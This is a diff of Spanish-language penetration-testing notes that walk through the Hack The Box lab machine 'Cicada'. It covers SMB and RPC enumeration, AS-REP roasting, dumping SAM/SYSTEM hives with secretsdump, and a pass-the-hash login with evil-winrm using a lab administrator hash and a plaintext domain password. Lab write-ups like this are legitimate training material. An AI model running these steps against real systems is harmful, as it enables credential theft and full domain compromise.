@@ -36,13 +36,17 @@ rpcclient -U "" 10.129.231.149
 Nos deja acceder pero no podemos enumerar usuarios del dominio con `enumdomusers`, tampoco podemos enumerar grupos de dominio `enumdomgroups`
 
 ##  Enumeración SMB (139, 445)
-Usaremos [[CRACKMAPEXEC]] para enumerar el `SMB`
-`nxc smb 10.129.231.149`
+Usaremos [[CRACKMAPEXEC]] para enumerar el `SMB` con la opción
+- `SMB` para indicar el servicio a usar
+```shell
+nxc smb 10.129.231.149
+```
 
 Nos devuelve como resultado que el dominio es `cicada.htb`, el cual añadimos al `/etc/hosts` como `10.129.231.149  cicada.htb dc01 dc01.cicada.htb`
 
 ### Recursos compartidos
-Enumeraremos los recursos compartidos con [[CRACKMAPEXEC]] con el parámetro `--shares` vara ver los recursos compartidos en red
+Enumeraremos los recursos compartidos con [[CRACKMAPEXEC]] con el parámetro
+- `--shares` vara ver los recursos compartidos en red
 `nxc smb 10.129.231.149 --shares`
 ### Null Session
 Podemos enumerar con una `Null Session` usando [[SMBCLIENT]] 
@@ -168,7 +172,7 @@ Nos devuelve que los usuarios son validos probaremos con este listado potencial 
 
 # Explotación
 ## AS-REP Roasting Attack
-Para ver si son susceptibles los usuarios a este ataque usaremos la herramienta `IMPACKET` con los parámetros
+Para ver si son susceptibles los usuarios a este ataque usaremos la herramienta [[IMPACKET]] con los parámetros
 - `-no-pass` para no usar contraseña
 - `-usersfile` para pasar una lista de usuarios
 ```shell
@@ -247,7 +251,9 @@ SYSVOL          READ            Logon server share
 
 Haremos una enumeración desde dentro con [[RPCCLIENT]] con los parámetros
 - `-U` para pasarle las credenciales
-`rpcclient -U 'michael.wrightson%Cicada$M6Corpb*@Lp#nZp!8' 10.129.231.149`
+```shell
+rpcclient -U 'michael.wrightson%Cicada$M6Corpb*@Lp#nZp!8' 10.129.231.149
+```
 
 Para enumerar los usuarios dentro de la maquina usaremos
 - Enumerar usuarios de dominio `enumdomusers`
@@ -375,6 +381,7 @@ Buscamos en el navegador como abusar de el, encontramos un repositorio de github
 
 En el que se explica paso por paso la escalada de privilegios explotando la vulnerabilidad
 ## Credential Dumping
+EN esta explotación extraemos la `SAM` y `SYSTEM` para desde fuera con [[IMPACKET]] poder interceptar los hashes que había en la maquina y poder elevar nuestros privilegios
 
 - Primero deberemos crear un directorio `/temp` 
 	```shell
@@ -399,17 +406,22 @@ download sam.hive
  download system.hive
  ```
 
- Usaremos [[IMPACKET]] pasandole las opciones de 
+ Usaremos [[IMPACKET]] pasándole las opciones de 
  - `-sam` para pasarle la `SAM` descargada
- - `-syste`
+ - `-system` para pasarle el `SYSTEM` descargado
+ - `LOCAL` para obtener los hashes de forma offline
   `impacket-secretsdump -sam sam.hive -system system.hive LOCAL`
 
-Obtenmiendo asi el hash del usuario administrador 
+Obteniendo así el hash del usuario administrador 
 ```ad-hint
 Administrator:2b87e7c93a3e8a0ea4a581937016f341
 ```
 
-Ahora nos podmeos conectar a la maquina siendo `Administrador` gracias al hash
+Ahora nos podemos conectar a la maquina siendo `Administrador` gracias al hash obtenido
+usando [[EVIL_WINRM]] con los parámetros
+- `-i` para pasar la IP
+- `-u` para pasar el usuario
+- `-H` para pasar el hash obtenido
 `evil-winrm  -i 10.129.231.149 -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341`
 
 
